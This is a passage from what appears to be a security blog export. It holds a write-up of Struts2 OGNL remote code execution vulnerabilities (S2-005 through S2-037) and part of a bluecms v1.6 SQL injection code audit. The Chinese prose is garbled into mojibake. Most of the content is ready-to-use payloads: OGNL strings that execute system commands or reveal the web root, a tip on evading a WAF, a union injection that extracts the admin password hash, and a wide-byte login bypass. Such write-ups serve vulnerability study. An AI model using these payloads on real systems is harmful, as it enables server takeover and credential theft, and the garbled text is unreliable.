è¡¨è¾¾å¼è§£æï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ„é€  Payload è¿›è¡Œå‘½ä»¤æ‰§è¡Œ ä¸Šæ–‡å¼•ç”¨rickgrayçš„æè¿°ã€‚ æ„é€ PoCè·å–tomcatæ‰§è¡Œè·¯å¾„1%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125; è·å–webæ ¹ç›®å½•1%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125; æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1%&#123;#a=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125; Struts2 S2-005å½±å“ç‰ˆæœ¬: 2.0.0 - 2.1.8.1 æ¼æ´è¯¦æƒ…: http://struts.apache.org/docs/s2-005.html struts2æ¼æ´çš„èµ·æºæºäºS2-003(å—å½±å“ç‰ˆæœ¬: ä½äºStruts 2.0.12)ï¼Œstruts2ä¼šå°†httpçš„æ¯ä¸ªå‚æ•°åè§£æä¸ºonglè¯­å¥æ‰§è¡Œ(å¯ç†è§£ä¸ºjavaä»£ç )ã€‚onglè¡¨è¾¾å¼é€šè¿‡#æ¥è®¿é—®strutsçš„å¯¹è±¡ï¼Œstrutsæ¡†æ¶é€šè¿‡è¿‡æ»¤#å­—ç¬¦é˜²æ­¢å®‰å…¨é—®é¢˜ï¼Œç„¶è€Œé€šè¿‡unicodeç¼–ç (\\u0023)æˆ–8è¿›åˆ¶(\\43)å³ç»•è¿‡äº†å®‰å…¨é™åˆ¶ï¼Œå¯¹äºS2-003æ¼æ´ï¼Œå®˜æ–¹é€šè¿‡å¢åŠ å®‰å…¨é…ç½®(ç¦æ­¢é™æ€æ–¹æ³•è°ƒç”¨å’Œç±»æ–¹æ³•æ‰§è¡Œç­‰)æ¥ä¿®è¡¥ï¼Œä½†æ˜¯å®‰å…¨é…ç½®è¢«ç»•è¿‡å†æ¬¡å¯¼è‡´äº†æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨OGNLè¡¨è¾¾å¼è®²è¿™2ä¸ªé€‰é¡¹æ‰“å¼€ï¼ŒS2-003çš„ä¿®è¡¥æ–¹æ¡ˆæŠŠè‡ªå·±ä¸Šäº†ä¸€ä¸ªé”ï¼Œä½†æ˜¯æŠŠé”é’¥åŒ™ç»™æ’åœ¨äº†é”å¤´ä¸Š ä¸Šæ–‡å¼•ç”¨LittleHannçš„æè¿° æ„é€ PoCè·å–webæ ¹ç›®å½•1(&apos;\\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\\43context[\\&apos;xwork.MethodAccessor.denyMethodExecution\\&apos;]\\75false&apos;)(b))&amp;(&apos;\\43c&apos;)((&apos;\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()&apos;)(d))&amp;(i2)((&apos;\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(i97)((&apos;\\43xman.getWriter().println(\\43req.getRealPath(%22\\u005c%22))&apos;)(d))&amp;(i99)((&apos;\\43xman.getWriter().close()&apos;)(d)) æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1(&apos;\\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\\43context[\\&apos;xwork.MethodAccessor.denyMethodExecution\\&apos;]\\75false&apos;)(b))&amp;(&apos;\\43c&apos;)((&apos;\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\\43mycmd\\75\\&apos;&quot;+cmd+&quot;\\&apos;&apos;)(d))&amp;(h)((&apos;\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)&apos;)(d))&amp;(i)((&apos;\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\\43myres\\75new\\40byte[51020]&apos;)(d))&amp;(k)((&apos;\\43mydat.readFully(\\43myres)&apos;)(d))&amp;(l)((&apos;\\43mystr\\75new\\40java.lang.String(\\43myres)&apos;)(d))&amp;(m)((&apos;\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\\43myout.getWriter().println(\\43mystr)&apos;)(d)) ä¸Šé¢2ä¸ªPoCæ‘˜è‡ªk8teamï¼Œä¸ºäº†å†™PoCï¼Œæœ‰æ‰€æ”¹åŠ¨ï¼Œä½†æ˜¯è¿™é‡Œå°±ä¸è´´ä¸Šæ¥äº†ï¼šï¼‰ Struts2 S2-009å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.1.1 æ¼æ´è¯¦æƒ…: https://struts.apache.org/docs/s2-009.html æ¼æ´åˆ©ç”¨ç‚¹è·ŸS2-003å’ŒS2-005ç±»ä¼¼ï¼Œåˆ©ç”¨OGNLè¡¨è¾¾å¼(1)(2),ä¼šæ‰§è¡Œ1çš„OGNLè¡¨è¾¾å¼ï¼Œ009æ„é€ äº†çš„æ–¹æ³•ä¸ºtest=(some OGNL è¡¨è¾¾å¼)(1)&amp;z[(test)(1)]=trueã€‚z[(test)(1)]=true,å¯¹struts2æ¥è¯´æ˜¯åˆæ³•çš„å‚æ•°ï¼Œä½†æ˜¯(test)(1)ä¼šæ‰§è¡Œä¸Šè¿°è¯´çš„æ–¹æ³•ï¼Œtestçš„å€¼è¢«å¸¦å…¥è®¡ç®—ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œã€‚ æ„é€ PoCå¼¹è®¡ç®—å™¨ps:å®éªŒç¯å¢ƒè¯•äº†å¥½å‡ æ¬¡éƒ½ä¸èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè·¯è¿‡çš„å¤§ä½¬æ±‚æŒ‡æ•™ï¼šï¼‰ 1person.name=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false), #_memberAccess[&quot;allowStaticMethodAccess&quot;]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec(&apos;open /Applications/Calculator.app&apos;))(meh)&amp;z[(person.name)(&apos;meh&apos;)]=true ç”¨çš„æ˜¯person/new-person.actionè¿™ä¸ªæ§åˆ¶å™¨ è·å–webæ ¹ç›®å½•1person.name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%20new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%2C%23outstr%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23outstr.println%28%27webpath%3A%27%2b%23req.getRealPath%28%22%2f%22%29%29%2C%23outstr.close%28%29%29%28meh%29&amp;z%5B%28person.name%29%28%27meh%27%29%5D&quot; Struts2 S2-012å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.13 æ¼æ´è¯¦æƒ…: https://cwiki.apache.org/confluence/display/WW/S2-012 Action ä¸­ Result æ—¶ä½¿ç”¨äº†é‡å®šå‘ç±»å‹ï¼Œå¹¶ä¸”è¿˜ä½¿ç”¨ ${param_name} ä½œä¸ºé‡å®šå‘å˜é‡,strutsåœ¨è·å–å…¶å€¼æ—¶ä¼šæ‰§è¡ŒOGNLè¡¨è¾¾å¼ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œ æ„é€ PoCè·å–webæ ¹è·¯å¾„1%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%29%7D æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%29%7D%0A%0A Struts2 S2-013/S2-014å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.14.1 æ¼æ´è¯¦æƒ…: https://cwiki.apache.org/confluence/display/WW/S2-013,https://cwiki.apache.org/confluence/display/WW/S2-014 æ ‡ç­¾s:urlå’Œs:aä¸­æä¾›includeå‚æ•°ï¼Œå…¶å‚æ•°å€¼å¯ä»¥ä¸º none - include no parameters in the URL (default) get - include only GET parameters in the URL all - include both GET and POST parameters in the URL å¦‚æœå‚æ•°å€¼ä¸ºgetæˆ–allï¼Œåœ¨è·å–å¯¹åº”çš„å‚æ•°å€¼æ—¶æ‰§è¡Œäº†OGNLè¡¨è¾¾å¼ æ„é€ PoCè·å–webæ ¹ç›®å½•1a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;webpath%3a&apos;%2b%23req.getRealPath(&quot;/&quot;)),%23out.close())&#125; æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;&quot;+cmd+&quot;&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;dbapp%3a&apos;%2bnew java.lang.String(%23d)),%23out.close())&#125; Struts2 S2-016å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.15 æ¼æ´è¯¦æƒ…: https://struts.apache.org/docs/s2-016.html DefaultActionMapper ç±»æ”¯æŒä»¥ action:ï¼Œredirect: å’Œ redirectAction: ä½œä¸ºè®¿é—®å‰ç¼€ï¼Œå‰ç¼€åé¢å¯ä»¥è·Ÿ OGNL è¡¨è¾¾å¼ï¼Œç”±äº Struts2 æœªå¯¹å…¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´ä»»æ„ Action å¯ä»¥ä½¿ç”¨è¿™äº›å‰ç¼€æ‰§è¡Œä»»æ„ OGNL è¡¨è¾¾å¼ï¼Œä»è€Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œ ä¸Šæ–‡å¼•ç”¨rickgrayçš„æè¿°ã€‚ æ„é€ PoCè·å–webæ ¹ç›®å½•1?redirect:$&#123;#req=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletReq&apos;+&apos;uest&apos;),#resp=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletRes&apos;+&apos;ponse&apos;),#resp.setCharacterEncoding(&apos;UTF-8&apos;),#ot=#resp.getWriter (),#ot.print(&apos;web&apos;),#ot.print(&apos;path:&apos;),#ot.print(#req.getSession().getServletContext().getRealPath(&apos;/&apos;)),#ot.flush(),#ot.close()&#125; æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1?redirect:$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;whoami&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&apos;co&apos;+&apos;m.ope&apos;+&apos;nsymph&apos;+&apos;ony.x&apos;+&apos;wor&apos;+&apos;k2.disp&apos;+&apos;atch&apos;+&apos;er.HttpSe&apos;+&apos;rvletRe&apos;+&apos;sponse&apos;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;&apos; è¿˜æœ‰ä¸€ç§æ¯”è¾ƒéšè”½çš„æ–¹æ³•ï¼Œå°†PoCæ”¾åœ¨æ–‡ä»¶ä¸Šä¼ çš„nameå¤„ï¼Œè¿‡wafã€‚ Struts2 S2-019å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.15.1 æ¼æ´è¯¦æƒ…: https://cwiki.apache.org/confluence/display/WW/S2-019 è¯¥æ¼æ´æˆå› ä¸ºå¼€å¯äº†å¼€å‘è€…æ¨¡å¼ï¼Œä¼ å…¥debug=command&amp;expression=å¯¼è‡´æ‰§è¡ŒOGNLè¡¨è¾¾å¼ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ æ„é€ PoCè·å–webæ ¹è·¯å¾„1debug=command&amp;expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A Struts2 S2-032å½±å“ç‰ˆæœ¬: 2.3.20 - 2.3.28 (except 2.3.20.3 and 2.3.24.3) æ¼æ´è¯¦æƒ…: https://struts.apache.org/docs/s2-032.html åœ¨é…ç½®äº† Struts2 DMI ä¸º True çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ method: Action å‰ç¼€å»è°ƒç”¨å£°æ˜ä¸º public çš„å‡½æ•°ï¼ŒDMI çš„ç›¸å…³ä½¿ç”¨æ–¹æ³•å¯å‚è€ƒå®˜æ–¹ä»‹ç»ï¼ˆDynamic Method Invocationï¼‰ï¼Œè¿™ä¸ª DMI çš„è°ƒç”¨ç‰¹æ€§å…¶å®ä¸€ç›´å­˜åœ¨ï¼Œåªä¸è¿‡åœ¨ä½ç‰ˆæœ¬ä¸­ Strtus2 ä¸ä¼šå¯¹ name æ–¹æ³•å€¼åš OGNL è®¡ç®—ï¼Œè€Œåœ¨é«˜ç‰ˆæœ¬ä¸­ä¼šï¼Œä»£ç è¯¦æƒ…å¯å‚è€ƒé˜¿å°”æ³•å®éªŒå®¤çš„æŠ¥å‘Š - ã€ŠApache Struts2 s2-032æŠ€æœ¯åˆ†æåŠæ¼æ´æ£€æµ‹è„šæœ¬ã€‹ ä¸Šæ–‡å¼•ç”¨rickgrayçš„æè¿°ã€‚ æ„é€ PoCè·å–webæ ¹ç›®å½•1?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath: æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag: Struts2 S2-037å½±å“ç‰ˆæœ¬: 2.3.20 - 2.3.28.1 æ¼æ´è¯¦æƒ…: http://struts.apache.org/docs/s2-037.html è¿™ä¸ªæ¼æ´å’Œä¹‹å‰S2-032/033æ˜¯ä¸€ä¸ªåœ°æ–¹ï¼Œéƒ½æ˜¯åœ¨DefaultActionInvocation.javaçš„invokeActionæ–¹æ³•ä¸­æ²¡æœ‰å¯¹äºmethodNameå‚æ•°å†…å®¹è¿›è¡Œæ ¡éªŒï¼Œä¾¿ç›´æ¥ä¸¢åˆ°äº†getValueæ–¹æ³•é‡Œé¢ï¼Œä»è€Œé€ æˆOnglè¡¨è¾¾å¼çš„æ³¨å…¥ã€‚ ä¸Šæ–‡å¼•ç”¨nsfocus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)çš„æè¿° æ„é€ PoCè·å–webæ ¹ç›®å½•1/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close):xx.toString.json?&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath: æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()):xx.toString.json?&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag: æ€»ç»“Struts2å‘½ä»¤æ‰§è¡Œç®—æ˜¯ä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„æ¼æ´äº†ï¼Œå¸Œæœ›ä»¥åæ·±å…¥javaçš„ä¸€äº›æ¡†æ¶ï¼Œå¯ä»¥ä»åº•å±‚æ¥åˆ†æï¼šï¼‰"},{"title":"ã€Code Reviewã€‘bluecms v1.6 Sql Injection åˆ†æ","permalink":"http://blog.0kami.cn/2017/01/11/old-bluecms-v1-6-Sql-Injection/","text":"æ¦‚è¿°å¾ˆä¹…æ²¡æœ‰ä»£ç å®¡è®¡äº†ï¼Œæ‹¿ä¸€å¥—ç®€å•çš„æ‰¾æ‰¾æ„Ÿè§‰ã€‚bluecmsæ˜¯ä¸€å¥—æ¯”è¾ƒè€çš„é—¨æˆ·ç½‘ç«™cmsï¼Œç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šå…³äºå®ƒçš„æ¼æ´è¿˜æœªä¿®è¡¥ï¼Œæ‰€ä»¥ä¸‹æ–‡çš„æ¼æ´ä¹Ÿä¸ç®—æ˜¯æœ€æ–°çš„ï¼Œä»…å½“æ˜¯ç»ƒç»ƒæ‰‹ã€‚ SQLæ³¨å…¥åˆ†æé¦–å…ˆå…³æ³¨ä¸€ä¸‹æ•°æ®çš„è¾“å…¥ å…¨å±€æ•°æ®è½¬ä¹‰åœ¨common.inc.phpä¸­ 1234567if(!get_magic_quotes_gpc())&#123; $_POST = deep_addslashes($_POST); $_GET = deep_addslashes($_GET); $_COOKIES = deep_addslashes($_COOKIES); $_REQUEST = deep_addslashes($_REQUEST);&#125; å†è·Ÿè¿›ä¸€ä¸‹deep_addslashes 123456789101112131415function deep_addslashes($str)&#123; if(is_array($str)) &#123; foreach($str as $key=&gt;$val) &#123; $str[$key] = deep_addslashes($val); &#125; &#125; else &#123; $str = addslashes($str); &#125; return $str;&#125; å¯ä»¥å‘ç°å¯¹æ•°æ®çš„æ³¨å…¥ï¼Œè¿›è¡Œäº†åŠ æ–œæ è½¬ä¹‰çš„æ“ä½œã€‚é‚£ä¹ˆæ¥ä¸‹æ¥æ‰¾æ³¨å…¥æ€è·¯ä¸»è¦æœ‰ä»¥ä¸‹3ç‚¹ï¼š æ‰¾æ•´æ•°å‹æ³¨å…¥ æ•´å¥—cmsé»˜è®¤gb2312ç¼–ç ï¼Œå®¹æ˜“é€ æˆå®½å­—èŠ‚æ³¨å…¥ httpå¤´å¹¶ä¸åœ¨è½¬ä¹‰çš„èŒƒå›´å†…ï¼Œæ‰€ä»¥ç±»ä¼¼å­˜å…¥ipï¼Œrefferçš„ä½ç½®ä¹Ÿèƒ½å‘ç”Ÿæ³¨å…¥ æ•´æ•°å‹æ³¨å…¥æ‹¿grepåŒ¹é…äº†ä¸€ä¸‹$_GETï¼Œæ‰¾åˆ°ä¸€å¤„ä¸åšå…¶ä»–è¿‡æ»¤çš„æ•´æ•°å‹ä½ç½® 1./ad_js.php:$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;; è·Ÿè¿›ad_js.php 12345678$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;if(empty($ad_id))&#123; echo &apos;Error!&apos;; exit();&#125;$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id); getoneå‡½æ•° 12345function getone($sql, $type=MYSQL_ASSOC)&#123; $query = $this-&gt;query($sql,$this-&gt;linkid); $row = mysql_fetch_array($query, $type); return $row;&#125; å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯¹ad_idæ²¡æœ‰åšå…¶ä»–è¿‡æ»¤å¤„ç†ï¼Œé€ æˆäº†æ•´æ•°å‹æ³¨å…¥,ç”±äºåé¢ä¼šå°†ad_contentæ‰“å°åœ¨é¡µé¢ä¸Šï¼Œæ‰€ä»¥ç›´æ¥ç”¨unionæ³¨å…¥å°±å¯ä»¥è·å¾—æ•°æ®ï¼Œæ„é€ payload 1/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,concat(admin_name,0x23,pwd)%20from%20blue_admin%20limit%201 ç»“æœå¯ä»¥åœ¨è¿”å›çš„ç•Œé¢ä¸­çœ‹åˆ° 123&lt;!--document.write(&quot;admin#21232f297a57a5a743894a0e4a801fc3&quot;);--&gt; ps:å› ä¸ºè¯¥cmsé”™è¯¯å›æ˜¾å…·ä½“sqlè¯­å¥ï¼Œè¡¨å‰ç¼€å¯ä»¥é€šè¿‡æŠ¥é”™çš„æ–¹æ³•æŠŠè¡¨å‰ç¼€çˆ†å‡ºæ¥ã€‚ å®½å­—èŠ‚æ³¨å…¥bluecmsæ“ä½œæ•°æ®åº“çš„å…·ä½“ç±»å®šä¹‰åœ¨mysql.class.php,é»˜è®¤è¿æ¥æ—¶çš„ç¼–ç ä¸ºgbkï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“å½“æ•°æ®åº“è¿æ¥æ—¶çš„ç¼–ç ä¸ºgbkç­‰åŒå­—èŠ‚ç¼–ç æ—¶ï¼Œå®¹æ˜“å‘ç”Ÿå®½å­—èŠ‚æ³¨å…¥ã€‚å‰é¢æåˆ°è¯¥å¥—cmså¯¹æ•°æ®è¾“å…¥è¿›è¡Œäº†è½¬ä¹‰çš„æ“ä½œï¼Œé‚£ä¹ˆåˆšåˆšå¥½æ¡ä»¶éƒ½é½äº†ï¼Œå¿…ç„¶å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ã€‚grepçœ‹äº†ä¸€ä¸‹ï¼ŒåŸºæœ¬ä¸Šçš„å­—ç¬¦ä¸²éƒ½åªæ˜¯åšäº†è½¬ä¹‰å¤„ç†ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²æ•°æ®è¾“å…¥ç‚¹éƒ½å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ã€‚å¤§å¤šæ•°æ³¨å…¥éƒ½æ˜¯ç›²æ³¨ï¼Œæ²¡æ‰¾åˆ°å…·ä½“å¯ä»¥ä¼šæ˜¾æ•°æ®çš„åœ°æ–¹ï¼Œè¿™é‡Œå°±ç®€å•çœ‹ä¸€ä¸‹ç™»é™†å¤„ åå°ç™»å½•å¤„å…¶å®å‰å°user.phpï¼Œä¹Ÿå­˜åœ¨æ³¨å…¥ï¼Œåªæ˜¯ç›²æ³¨ï¼Œè¿™é‡Œå°±å–ç®€å•çš„åå°ç™»å½•éªŒè¯å¤„admin/login.php 12345678910111213141516171819202122elseif($act == &apos;do_login&apos;)&#123; $admin_name = isset($_POST[&apos;admin_name&apos;]) ? trim($_POST[&apos;admin_name&apos;]) : &apos;&apos;; $admin_pwd = isset($_POST[&apos;admin_pwd&apos;]) ? trim($_POST[&apos;admin_pwd&apos;]) : &apos;&apos;; $remember = isset($_POST) ? intval($_POST[&apos;rememberme&apos;]) : 0; if($admin_name == &apos;&apos;)&#123; showmsg(&apos;xxx&apos;); &#125; if($admin_pwd == &apos;&apos;)&#123; showmsg(&apos;xxx&apos;); &#125; if(check_admin($admin_name, $admin_pwd))&#123; update_admin_info($admin_name); if($remember == 1)&#123; setcookie(&apos;Blue[admin_id]&apos;, $_SESSION[&apos;admin_id&apos;], time()+86400); setcookie(&apos;Blue[admin_name]&apos;, $admin_name, time()+86400); setcookie(&apos;Blue[admin_pwd]&apos;, md5(md5($admin_pwd).$_CFG[&apos;cookie_hash&apos;]), time()+86400); &#125; &#125;else&#123; showmsg(&apos;xxx&apos;); &#125; showmsg(&apos;xxx&apos;, &apos;index.php&apos;); &#125; ç»§ç»­è·Ÿè¿›check_admin 12345678910111213function check_admin($name, $pwd)&#123; global $db; $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;); if($row[&apos;num&apos;] &gt; 0) &#123; return true; &#125; else &#123; return false; &#125;&#125; å¯ä»¥çœ‹åˆ°è¿™é‡Œå‘ç”Ÿäº†ä¸€æ¬¡ç™»é™†éªŒè¯ï¼Œå¯ä»¥é€šè¿‡å®½å­—èŠ‚æ³¨å…¥æ¥åšä¸‡èƒ½å¯†ç ç™»é™†ã€‚ 1user_name=admin%65%27+or+1%3D1%23&amp;pwd=123 å­˜å…¥ipé€ æˆæ³¨å…¥åœ¨common.inc.phpä¸­å¯ä»¥æ‰¾åˆ°getip()å‡½æ•° 12345678910111213141516171819202122232425262728function getip()&#123; if (getenv(&apos;HTTP_CLIENT_IP&apos;)) &#123; $ip = getenv(&apos;HTTP_CLIENT_IP&apos;); &#125; elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;)) &#123; $ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;); &#125; elseif (getenv(&apos;HTTP_X_FORWARDED&apos;)) &#123; $ip = getenv(&apos;HTTP_X_FORWARDED&apos;); &#125; elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;)) &#123; $ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;); &#125; elseif (getenv(&apos;HTTP_FORWARDED&apos;)) &#123; $ip = getenv(&apos;HTTP_FORWARDED&apos;); &#125; else &#123; $ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; &#125; return $ip;&#125; å†çœ‹çœ‹è°ƒç”¨ä»–çš„ä½ç½® online_ipè°ƒç”¨å¤„ çœ‹çœ‹guest_book.phpå¤„å­˜åœ¨insertæ³¨å…¥ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è¦†ç›–åé¢çš„contentï¼Œé€ æˆæ•°æ®å›æ˜¾ã€‚é€šè¿‡xffä¼ 